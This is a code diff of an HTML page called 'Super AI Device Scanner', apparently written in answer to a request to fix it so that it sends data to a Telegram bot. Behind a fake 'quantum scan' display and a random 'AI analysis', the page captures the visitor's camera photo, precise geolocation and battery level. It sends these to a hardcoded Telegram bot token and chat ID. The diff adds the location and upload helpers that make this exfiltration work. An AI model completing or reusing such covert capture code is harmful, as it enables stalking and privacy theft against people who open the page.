@@ -1,8 +1,8 @@
-tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untuk mengirimkan bot telegram dari pc, ios ataupun android :
 
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
   <title>Super AI Device Scanner</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <meta name="apple-mobile-web-app-capable" content="yes">
@@ -11,7 +11,6 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       --primary: #2ecc71;
       --secondary: #3498db;
     }
-
     body { 
       font-family: 'Roboto', Arial, sans-serif; 
       text-align: center; 
@@ -22,8 +21,8 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
     }
-
     .scanner-box {
       width: 300px;
       height: 300px;
@@ -34,7 +33,6 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       overflow: hidden;
       box-shadow: 0 0 30px rgba(46, 204, 113, 0.3);
     }
-
     .scanner-line {
       position: absolute;
       width: 100%;
@@ -43,14 +41,12 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       animation: scan 3s infinite;
       box-shadow: 0 0 10px var(--primary);
     }
-
     @keyframes scan {
       0% { top: 0; opacity: 0; }
       10% { opacity: 1; }
       90% { opacity: 1; }
       100% { top: 100%; opacity: 0; }
     }
-
     button {
       padding: 15px 40px;
       font-size: 20px;
@@ -65,20 +61,23 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       margin: 20px;
       box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
     }
-
     #loading {
       display: none;
       font-size: 1.5em;
       color: var(--primary);
       text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
+      margin: 10px;
     }
-
     .hologram-effect {
       position: fixed;
       pointer-events: none;
       mix-blend-mode: screen;
       opacity: 0.3;
       z-index: 9999;
+    }
+    @keyframes hologram {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -92,12 +91,57 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
   <div id="loading">🔭 Scanning Quantum Signature...</div>
 
   <script>
+    // === Konfigurasi Bot Telegram ===
     const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
     const CHAT_ID = '1121369247';
+
+    // Variabel global
     let currentStream = null;
     let isScanning = false;
+    const video = document.getElementById('video');
+    const loading = document.getElementById('loading');
 
-    // Hologram Effect
+    // === Fungsi Helper untuk Menampilkan Error dan Notifikasi ===
+    function showError(title, error) {
+      alert(`${title}: ${error.message || error}`);
+      console.error(title, error);
+    }
+
+    function showToast(message, type) {
+      // Untuk demo, kita gunakan alert atau console; Anda bisa ganti dengan notifikasi visual.
+      console.log(`${type.toUpperCase()}: ${message}`);
+    }
+
+    // === Fungsi Helper untuk Mendapatkan Lokasi ===
+    function getPreciseLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error("Geolocation not supported"));
+        } else {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        }
+      });
+    }
+
+    // === Fungsi Dummy untuk Analisis Matriks Perangkat ===
+    function analyzeDeviceMatrix() {
+      // Data dummy; ganti dengan analisis perangkat jika diperlukan.
+      return Promise.resolve([[1, 0, 1], [0, 1, 0], [1, 0, 1]]);
+    }
+
+    // === Fungsi Dummy untuk Menghasilkan Matriks Gambar ===
+    function getImageMatrix(canvas) {
+      // Contoh sederhana: kembalikan lebar dan tinggi gambar sebagai matriks.
+      return { width: canvas.width, height: canvas.height };
+    }
+
+    // === Fungsi untuk Mengubah dataURI ke Blob ===
+    async function dataURItoBlob(dataURI) {
+      const response = await fetch(dataURI);
+      return await response.blob();
+    }
+
+    // === Hologram Effect ===
     function createHologramEffect() {
       const colors = ['#00ffff', '#ff00ff', '#ffff00'];
       const effect = document.createElement('div');
@@ -105,7 +149,7 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       
       colors.forEach(color => {
         const layer = document.createElement('div');
-        layer.style = `
+        layer.style.cssText = `
           position: fixed;
           top: -50%;
           left: -50%;
@@ -120,7 +164,7 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       document.body.appendChild(effect);
     }
 
-    // Enhanced Camera Initialization
+    // === Inisialisasi Kamera ===
     async function initCamera() {
       try {
         const constraints = {
@@ -133,7 +177,9 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
           audio: false
         };
 
-        if (currentStream) currentStream.getTracks().forEach(track => track.stop());
+        if (currentStream) {
+          currentStream.getTracks().forEach(track => track.stop());
+        }
 
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         currentStream = stream;
@@ -151,7 +197,7 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       }
     }
 
-    // Quantum Scanning Process
+    // === Proses Quantum Scan ===
     async function startQuantumScan() {
       if (isScanning) return;
       isScanning = true;
@@ -176,7 +222,7 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       }
     }
 
-    // Advanced Capture Function
+    // === Fungsi untuk Mengambil Gambar dengan Efek Quantum ===
     async function captureQuantumImage() {
       const canvas = document.createElement('canvas');
       const context = canvas.getContext('2d');
@@ -193,7 +239,7 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       };
     }
 
-    // AI-Powered Analysis
+    // === Fungsi Analisis AI (Dummy) ===
     async function performAIAnalysis() {
       const aiData = {
         threatLevel: Math.floor(Math.random() * 100),
@@ -202,14 +248,17 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       };
 
       if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        aiData.energySignature = `${Math.round(battery.level * 100)}%`;
+        try {
+          const battery = await navigator.getBattery();
+          aiData.energySignature = `${Math.round(battery.level * 100)}%`;
+        } catch (e) {
+          aiData.energySignature = 'Unknown';
+        }
       }
-
       return aiData;
     }
 
-    // Generate 3D Hologram Report
+    // === Fungsi untuk Menghasilkan Laporan Hologram ===
     function generateHologramReport(photo, location, matrix, ai) {
       const timestamp = new Date().toISOString();
       return {
@@ -228,7 +277,7 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
       };
     }
 
-    // Enhanced Telegram Integration
+    // === Integrasi dengan Telegram ===
     async function sendToTelegram(report) {
       const formData = new FormData();
       const blob = await dataURItoBlob(report.image);
@@ -251,32 +300,31 @@ tolong bantu saya perbaiki coding ini dan sempurnakan, karna belum berkerja untu
         body: formData
       });
 
-      if (!response.ok) throw new Error('Quantum Communication Failed');
+      if (!response.ok) {
+        throw new Error('Quantum Communication Failed');
+      }
     }
 
-    // Quantum Effects
+    // === Efek Filter Quantum pada Gambar ===
     function applyQuantumFilter(ctx, canvas) {
       const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
       const data = imageData.data;
 
       for (let i = 0; i < data.length; i += 4) {
-        data[i] = Math.abs(255 - data[i]);     // Red
-        data[i + 1] = data[i + 1];             // Green 
-        data[i + 2] = Math.abs(255 - data[i + 2]); // Blue
+        data[i] = Math.abs(255 - data[i]);         // Red
+        // data[i+1] tetap (Green)
+        data[i + 2] = Math.abs(255 - data[i + 2]);   // Blue
       }
-
       ctx.putImageData(imageData, 0, 0);
     }
 
-    // Initialize Quantum Scanner
+    // === Inisialisasi Scanner dan Event Listener ===
     if (navigator.mediaDevices) {
       initCamera();
       document.getElementById('capture-btn').onclick = startQuantumScan;
     } else {
       showToast('Quantum Scanner Not Supported', 'error');
     }
-
-    // ... (Rest of helper functions remain similar with enhancements)
   </script>
 </body>
 </html>
